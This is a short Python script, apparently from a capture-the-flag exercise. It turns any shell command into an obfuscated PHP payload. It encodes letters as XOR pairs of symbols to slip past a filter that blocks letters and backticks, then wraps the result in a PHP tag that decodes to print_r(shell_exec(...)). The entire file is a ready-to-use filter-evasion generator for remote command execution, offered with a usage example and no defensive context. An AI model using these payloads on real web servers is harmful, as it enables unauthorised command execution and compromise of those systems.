import string,urllib,sys
from urllib.parse import unquote
import urllib.parse
from urllib.parse import unquote

filter = string.ascii_letters + "`"

def check(stri):
        flag = 1
        for x in stri :
                if x in filter :
                        flag = 0
                        break
        return flag

allowed = []
for x in range(256):
        if chr(x) not in filter and check(urllib.parse.quote(chr(x))):
                allowed.append(chr(x))

if len(sys.argv) < 2 :
	exit("usage : shell.py <command>")
input = sys.argv[1]

output = ''
for char in input :
        if char in filter :
                flag = 0
                for i in allowed :
                        if not flag :
                                for x in range(100):
                                        if chr(ord(i) ^ ord(unquote('%'+(2-len(str(x)))*'0'+str(x)))) == char  and check(unquote('%'+(2-len(str(x)))*'0'+str(x))):
                                                output += "('"+"%"+(2-len(str(x)))*"0"+str(x)+"'^'"+urllib.parse.quote(i)+"')."
                                                flag = 1
                                                break
                        else :
                                break
        else :
                output += ".'"+char+"'."
output = output.replace('..','.').replace("'.'(","'.'.(").replace("'''","'\\''")
if output[-1] == '.':
        output = output[:-1]
else :
        output = output
if output[0] == '.':
        output = output[1:]


execute = "(('@'^'0').('@'^'2').('@'^')').('@'^'.').('@'^'4').'_'.('@'^'2'))((('@'^'3').('@'^'(').('@'^'%').('3'^'_').('3'^'_').'_'.('@'^'%').('@'^'8').('@'^'%').('@'^'#'))"
print("<?="+unquote(execute)+"("+unquote(output)+"))"+";")
# ex : python shell.py ls
